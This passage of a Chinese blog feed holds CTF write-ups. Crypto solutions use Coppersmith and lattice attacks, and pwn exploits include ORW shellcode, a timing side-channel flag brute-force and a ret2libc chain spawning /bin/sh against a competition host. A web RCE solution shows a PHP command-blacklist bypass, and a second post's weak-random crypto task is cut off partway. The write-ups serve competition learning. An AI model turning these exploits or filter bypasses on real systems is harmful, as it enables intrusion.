<span class="keyword">raise</span> ValueError(<span class="string">&quot;0.0 &lt; beta &lt;= 1.0 not satisfied.&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    f = self.change_ring(ZZ)  </span><br><span class="line">  </span><br><span class="line">    P, (x,) = f.parent().objgens()  </span><br><span class="line">  </span><br><span class="line">    delta = f.degree()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> epsilon <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">        epsilon = beta / <span class="number">8</span>  </span><br><span class="line">    verbose(<span class="string">&quot;epsilon = %f&quot;</span> % epsilon, level=<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    m = <span class="built_in">max</span>(beta**<span class="number">2</span> / (delta * epsilon), <span class="number">7</span> * beta / delta).ceil()  </span><br><span class="line">    verbose(<span class="string">&quot;m = %d&quot;</span> % m, level=<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    t = <span class="built_in">int</span>((delta * m * (<span class="number">1</span> / beta - <span class="number">1</span>)).floor())  </span><br><span class="line">    verbose(<span class="string">&quot;t = %d&quot;</span> % t, level=<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> X <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">        X = (<span class="number">0.5</span> * N ** (beta**<span class="number">2</span> / delta - epsilon)).ceil()  </span><br><span class="line">    verbose(<span class="string">&quot;X = %s&quot;</span> % X, level=<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># we could do this much faster, but this is a cheap step  </span></span><br><span class="line">    <span class="comment"># compared to LLL    g = [x**j * N ** (m - i) * f**i for i in range(m) for j in range(delta)]  </span></span><br><span class="line">    g.extend([x**i * f**m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)])  <span class="comment"># h  </span></span><br><span class="line">  </span><br><span class="line">    B = Matrix(ZZ, <span class="built_in">len</span>(g), delta * m + <span class="built_in">max</span>(delta, t))  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B.nrows()):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(g[i].degree() + <span class="number">1</span>):  </span><br><span class="line">            B[i, j] = g[i][j] * X**j  </span><br><span class="line">  </span><br><span class="line">    B = flatter(B)  </span><br><span class="line">    <span class="comment"># B = B.LLL(**kwds)  </span></span><br><span class="line">  </span><br><span class="line">    f = <span class="built_in">sum</span>([ZZ(B[<span class="number">0</span>, i] // X**i) * x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B.ncols())])  </span><br><span class="line">    R = f.roots()  </span><br><span class="line">  </span><br><span class="line">    ZmodN = self.base_ring()  </span><br><span class="line">    roots = <span class="built_in">set</span>([ZmodN(r) <span class="keyword">for</span> r, m <span class="keyword">in</span> R <span class="keyword">if</span> <span class="built_in">abs</span>(r) &lt;= X])  </span><br><span class="line">    Nbeta = N**beta  </span><br><span class="line">    <span class="keyword">return</span> [root <span class="keyword">for</span> root <span class="keyword">in</span> roots <span class="keyword">if</span> N.gcd(ZZ(self(root))) &gt;= Nbeta]</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> trange(<span class="number">1</span> &lt;&lt; <span class="number">4</span>):  </span><br><span class="line">    tmp = hint - (y &lt;&lt; (<span class="number">252</span> - <span class="number">4</span>))  </span><br><span class="line">    f = tmp - x  </span><br><span class="line">    f = f.monic()  </span><br><span class="line">    res = small_roots(f, X = <span class="number">2</span>^(<span class="number">252</span> - <span class="number">4</span>), beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)  </span><br><span class="line">    <span class="keyword">if</span> res:  </span><br><span class="line">        <span class="built_in">print</span>(res)  </span><br><span class="line">        p = gcd(tmp - ZZ(res[<span class="number">0</span>]), N)  </span><br><span class="line">        q = N // p  </span><br><span class="line">        r = (y &lt;&lt; (<span class="number">252</span> - <span class="number">4</span>)) + ZZ(res[<span class="number">0</span>])  </span><br><span class="line">        leak=p*q*r  </span><br><span class="line">        r_bytes = long_to_bytes(leak)  </span><br><span class="line">        iv = r_bytes[:<span class="number">16</span>] <span class="keyword">if</span> <span class="built_in">len</span>(r_bytes) &gt;= <span class="number">16</span> <span class="keyword">else</span> r_bytes + <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(r_bytes))  </span><br><span class="line">        key = sha256(<span class="built_in">str</span>(p + q + r).encode()).digest()[:<span class="number">16</span>]   </span><br><span class="line">        crypt_sm4 = CryptSM4()  </span><br><span class="line">        crypt_sm4.set_key(key, SM4_DECRYPT)  </span><br><span class="line">        m = crypt_sm4.crypt_cbc(iv, <span class="built_in">bytes</span>.fromhex(c))  </span><br><span class="line">        <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>可以得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003247177.png" /></p><h3 id="three-vertical-lines">three vertical lines</h3><blockquote><p>这道题也是赛后做的，比赛的时候还没意识到之前做过一道类似的题</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line"><span class="keyword">from</span> rsa.prime <span class="keyword">import</span> getprime  </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):  </span><br><span class="line">    p=getprime(<span class="number">256</span>)  </span><br><span class="line">    q=getprime(<span class="number">256</span>)  </span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="number">3</span>*p**<span class="number">5</span>+<span class="number">4</span>*q**<span class="number">5</span>):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>*p**<span class="number">5</span>+<span class="number">4</span>*q**<span class="number">5</span>)  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(bytes_to_long(flag), e, p * q)) </span><br></pre></td></tr></table></figure><p>已知信息很少，只有一个<span class="math inline">\(3p^5+4q^5\)</span>以及<span class="math inline">\(p,q\)</span>都是质数，记<span class="math inline">\(3p^5+4q^5=r\)</span>，将该式置于模<span class="math inline">\(r\)</span>下有： <span class="math display">\[3p^5+4q^5\equiv p^5+\frac{4}{3}q^5\equiv0\pmod{r}\]</span> 即： <span class="math display">\[p^5\equiv -\frac{4}{3}q^5\pmod{r}\]</span> 设整数<span class="math inline">\(a\in(0,r)\)</span>满足<span class="math inline">\(a^5\equiv-\frac{4}{3}\pmod{r}\)</span>，那么有： <span class="math display">\[p^5\equiv(aq)^5\pmod{r}\]</span> 开根有： <span class="math display">\[p\equiv aq\pmod{r}\]</span> 即<span class="math inline">\(aq - kr=p\)</span>（其中<span class="math inline">\(k\)</span>为整数），那么可以构造出如下格： <span class="math display">\[\left(\begin{matrix}1&amp;a\\0&amp;-r\end{matrix}\right)\]</span> 有如下关系： <span class="math display">\[(q,k)\left(\begin{matrix}1&amp;a\\0&amp;-r\end{matrix}\right)=(q,p)\]</span> 通过格规约算法即可得到<span class="math inline">\(p,q\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = ...</span><br><span class="line">c = ...</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(r)[]</span><br><span class="line">A = <span class="number">4</span> * inverse(<span class="number">3</span>, r) % r</span><br><span class="line">f = x^<span class="number">5</span> + A</span><br><span class="line">a = ZZ(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, [[<span class="number">1</span>, a], [<span class="number">0</span>, r]])</span><br><span class="line"></span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">abs</span>(res[<span class="number">0</span>]))</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">abs</span>(res[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></p><h2 id="pwn">Pwn</h2><h3 id="三步走战略">三步走战略</h3><p>有个沙箱：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003243611.png" alt="Pasted image 20250607201355" /><figcaption>Pasted image 20250607201355</figcaption></figure><p>显然只允许使用<code>open</code>,<code>write</code>,<code>read</code>，又有输入部分：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003242546.png" alt="Pasted image 20250607201515" /><figcaption>Pasted image 20250607201515</figcaption></figure><p>这里给<code>buf</code>分配了一个可读可写可执行而且很大的区间，所以我们可以向里面写入可执行代码，那么我们就可以向里面写入ORW的shellcode，之后通过栈溢出跳转执行那段shellcode：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">buf = <span class="number">0x1337000</span>  </span><br><span class="line">  </span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e </span></span><br><span class="line"><span class="string">push rax </span></span><br><span class="line"><span class="string">mov rdi,rsp  </span></span><br><span class="line"><span class="string">xor rax,rax  </span></span><br><span class="line"><span class="string">mov al,2</span></span><br><span class="line"><span class="string">syscall  </span></span><br><span class="line"><span class="string">mov rdi,rax  </span></span><br><span class="line"><span class="string">mov dl,0x40 </span></span><br><span class="line"><span class="string">mov rsi,rsp  </span></span><br><span class="line"><span class="string">mov al,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">payload = asm(shellcode)  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.198&quot;</span>, <span class="number">36461</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;I think you need to prepare your acceptance speech in advance. &#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Please speak:&#x27;</span>, payload)  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(buf)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Do you have anything else to say?&#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="shellcode">shellcode</h3><p>没有W的ORW，反编译可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003240341.png" alt="Pasted image 20250607195104" /><figcaption>Pasted image 20250607195104</figcaption></figure><p>进入沙箱可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003238659.png" alt="Pasted image 20250607195131" /><figcaption>Pasted image 20250607195131</figcaption></figure><p>可以看到不能用<code>execve</code>和<code>write</code>还有<code>sendfile</code>，考虑通过测信道逐字符爆破flag，exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  </span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genshellcode</span>(<span class="params">idx, c</span>):  </span><br><span class="line">    shellcode = <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    mov rdi, 0x67616c662f2e    </span></span><br><span class="line"><span class="string">    push rdi    </span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0    </span></span><br><span class="line"><span class="string">    mov rdx, 0    </span></span><br><span class="line"><span class="string">    mov rax, 2    </span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 3    </span></span><br><span class="line"><span class="string">    mov rsi, rsp    </span></span><br><span class="line"><span class="string">    mov rdx, 0x100    </span></span><br><span class="line"><span class="string">    mov rax, 0    </span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov dl, byte ptr [rsp+&#123;0&#125;]    </span></span><br><span class="line"><span class="string">    mov cl, &#123;1&#125;    </span></span><br><span class="line"><span class="string">    cmp dl, cl    </span></span><br><span class="line"><span class="string">    jz loop    </span></span><br><span class="line"><span class="string">    ret    </span></span><br><span class="line"><span class="string">    loop:    </span></span><br><span class="line"><span class="string">    jmp loop    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(idx, c)  </span><br><span class="line">    <span class="keyword">return</span> asm(shellcode)  </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>  </span><br><span class="line">idx = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    update = <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">b&#x27;lg0123456789abcdef-&#123;&#125;&#x27;</span>:  </span><br><span class="line">        p = remote(<span class="string">&quot;27.25.151.198&quot;</span>, <span class="number">43975</span>)  </span><br><span class="line">        shellcode = genshellcode(idx, ch)  </span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Enter your command: &#x27;</span>, shellcode)  </span><br><span class="line">        start = time.time()  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            p.recv(timeout=<span class="number">10</span>)  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="keyword">pass</span>  </span><br><span class="line">        end = time.time()  </span><br><span class="line">        p.close()  </span><br><span class="line">        <span class="keyword">if</span> (end - start &gt; <span class="number">8</span>):  </span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)  </span><br><span class="line">            last = <span class="built_in">chr</span>(ch)  </span><br><span class="line">            update = <span class="literal">True</span>  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[update flag] &quot;</span> + flag)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">assert</span> (update == <span class="literal">True</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (last == <span class="string">&#x27;&#125;&#x27;</span>):  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    idx += <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> + flag)</span><br></pre></td></tr></table></figure><h3 id="pdd助力">pdd助力</h3><p><code>main</code>函数反汇编如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003235417.png" alt="Pasted image 20250607210958" /><figcaption>Pasted image 20250607210958</figcaption></figure><p>可以见到第一部分随机数的种子只可能是0、1、2、3、4之间的一个减去44174237，我们可以选择0作为种子生成一串随机数，有20%的概率成功，而第二部分很显然固定了种子为8，这样的话就不用再去抽奖了，在这之后就会进入<code>func</code>函数：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003233817.png" alt="Pasted image 20250607211241" /><figcaption>Pasted image 20250607211241</figcaption></figure><p>明显存在栈溢出，而这个程序没有canary和PIE，所以可以直接打ret2libc，exp如下（成功率20%）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.198&quot;</span>, <span class="number">41172</span>)  </span><br><span class="line">  </span><br><span class="line">randList1 = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">randList2 = [<span class="number">8</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>]</span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> randList1:  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;good!\n&#x27;</span>, <span class="built_in">str</span>(i).encode())  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> randList2:  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;good!\n&#x27;</span>, <span class="built_in">str</span>(i).encode())  </span><br><span class="line">  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">pop_rdi = <span class="number">0x401483</span>  </span><br><span class="line">ret = <span class="number">0x40101a</span>  </span><br><span class="line">vuln = <span class="number">0x40121f</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">48</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Congratulations young man.\n&#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">puts_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">libc_base = puts_real - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">log.info(<span class="string">f&#x27;puts_real: <span class="subst">&#123;<span class="built_in">hex</span>(puts_real)&#125;</span>&#x27;</span>)  </span><br><span class="line">log.info(<span class="string">f&#x27;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">48</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Congratulations young man.\n&#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="web">Web</h2><h3 id="really_ez_rce">Really_Ez_Rce</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,                <span class="variable">$cmd</span>            )) &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了一堆命令的RCE，可以通过<code>$(echo -n)</code>输出空字符串的方式来绕过大部分命令限制，可以尝试通过遍历文件的方式来读取当前目录下的所有文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> $(l$(<span class="built_in">echo</span> -n)s); <span class="keyword">do</span> c$(<span class="built_in">echo</span> -n)a$(<span class="built_in">echo</span> -n)t <span class="variable">$f</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure> 但是当前目录下只有<code>index.php</code>，因为<code>/</code>没有被过滤，所以<code>l$(echo -n)s /</code>查看根目录可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003230642.png" alt="Pasted image 20250607234505" /><figcaption>Pasted image 20250607234505</figcaption></figure><p>flag确实在根目录，因为<code>cd</code>没有被过滤，所以直接通过如下命令来遍历该目录并输出，因为根目录下只有<code>flag.txt</code>一个文件（其它均为目录），所以可以通过如下命令得到flag：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /; <span class="keyword">for</span> f <span class="keyword">in</span> $(l$(<span class="built_in">echo</span> -n)s); <span class="keyword">do</span> c$(<span class="built_in">echo</span> -n)a$(<span class="built_in">echo</span> -n)t <span class="variable">$f</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>传入<code>cmd</code>命令后可以得到flag：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003228965.png" alt="Pasted image 20250607234756" /><figcaption>Pasted image 20250607234756</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Pwn </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届OpenHarmony CTF专题赛（线上选拔赛）Crypto Write UP</title>
      <link href="/2025/06/10/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B%EF%BC%88%E7%BA%BF%E4%B8%8A%E9%80%89%E6%8B%94%E8%B5%9B%EF%BC%89Crypto-WriteUP/"/>
      <url>/2025/06/10/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B%EF%BC%88%E7%BA%BF%E4%B8%8A%E9%80%89%E6%8B%94%E8%B5%9B%EF%BC%89Crypto-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="weak_random">Weak_random</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">message</span>):  </span><br><span class="line">    padding_len = <span class="number">16</span> - <span class="built_in">len</span>(message)%<span class="number">16</span>  </span><br><span class="line">    ret = <span class="built_in">hex</span>(padding_len)[<span class="number">2</span>:].zfill(<span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(ret*padding_len)+message  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weak_entropy</span>():  </span><br><span class="line">    time_now=time.time()%<span class="number">10000</span>  </span><br><span class="line">  </span><br><span class="line">    entropy_part1 = <span class="built_in">int</span>(time_now) &amp; <span class="number">0xFFFF</span>   </span><br><span class="line">    entropy_part2 = os.getpid() &amp; <span class="number">0xFF</span>  </span><br><span class="line">  </span><br><span class="line">    final_seed = entropy_part1 + (entropy_part2 &lt;&lt; <span class="number">8</span>)   </span><br><span class="line">    random.seed(final_seed)  </span><br><span class="line">      </span><br><span class="line">    key = random.getrandbits(<span class="number">128</span>)   </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> key  </span><br><span class="line">entropy_key=get_weak_entropy()  </span><br><span class="line">iv = os.urandom(<span class="number">16</span>)  </span><br><span class="line">key_bytes = entropy_key.to_bytes(<span class="number">16</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">msg=padding(flag.encode())  </span><br><span class="line">aes = AES.new(key_bytes,AES.MODE_CBC,iv=iv)  </span><br><span class="line">enc = aes.encrypt(msg)  </span><br><span class="line"><span class="built_in">print</span>(enc.<span class="built_in">hex</span>())  </span><br><span 